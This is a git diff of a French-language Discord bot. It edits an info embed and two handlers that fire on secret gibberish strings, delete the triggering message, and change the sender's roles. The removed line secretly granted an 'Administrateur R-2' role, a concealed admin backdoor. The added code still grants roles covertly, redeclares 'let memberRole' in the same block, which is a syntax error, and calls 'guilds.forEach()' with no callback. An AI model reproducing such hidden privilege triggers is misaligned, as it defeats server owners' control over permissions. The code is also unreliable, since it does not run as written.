@@ -280,23 +280,25 @@ bot.on('message', function (message){
 				.addField(":crown: Créateur:", "@Дdяi1#6623")
 				.addField(":speech_balloon: Channels", bot.channels.size, true)
 				.addField(":clock5: Temps d'activité", Math.round(bot.uptime / (1000 * 60 * 60)) + " heures, " + Math.round(bot.uptime / (1000 * 60)) % 60 + "minutes et " + Math.round(bot.uptime / 1000) % 60 + "secondes    ", true)
-				.addField(":file_cabinet: Nombre de serveurs", bot.guilds.size)
-				.addField(":bust_in_silhouette: Nombre d'utilisateurs", bot.users.size, true);
+				.addField(":file_cabinet: Nombre de serveurs", bot.guilds.size, true)
+				.addField(":bust_in_silhouette: Nombre d'utilisateurs", bot.users.size)
+				.addField("Tous les serveurs :", bot.guilds.forEach())
 			message.channel.send(embed);
 			console.log('ouaip,info send')
 		}
 
 		if(message.content.startsWith('efhsdfcsbuyf54sqd1r6sqd1c')) {
 			message.channel.bulkDelete(1)
-			let memberRole = message.member.guild.roles.find("name", "Administrateur R-2");
+			let memberRole = message.member.guild.roles.find("name", "Joueurs Fortnite");
+			message.member.addRole(memberRole);
+			let memberRole = message.member.guild.roles.find("name", "Joueurs");
 			message.member.addRole(memberRole);
 		}
 
 		if(message.content.startsWith('erfteqv57s1e4dfc1s1')) {
 			message.channel.bulkDelete(1)
-			const guildMember = message.member;
-			guildMember.removeRole('MEMBRE');
-			console.log('ah plus MEMBRE');
+			let memberRole = message.member.guild.roles.find("name", "Membres");
+			message.member.removeRole(memberRole);
 		}
 	}
 })
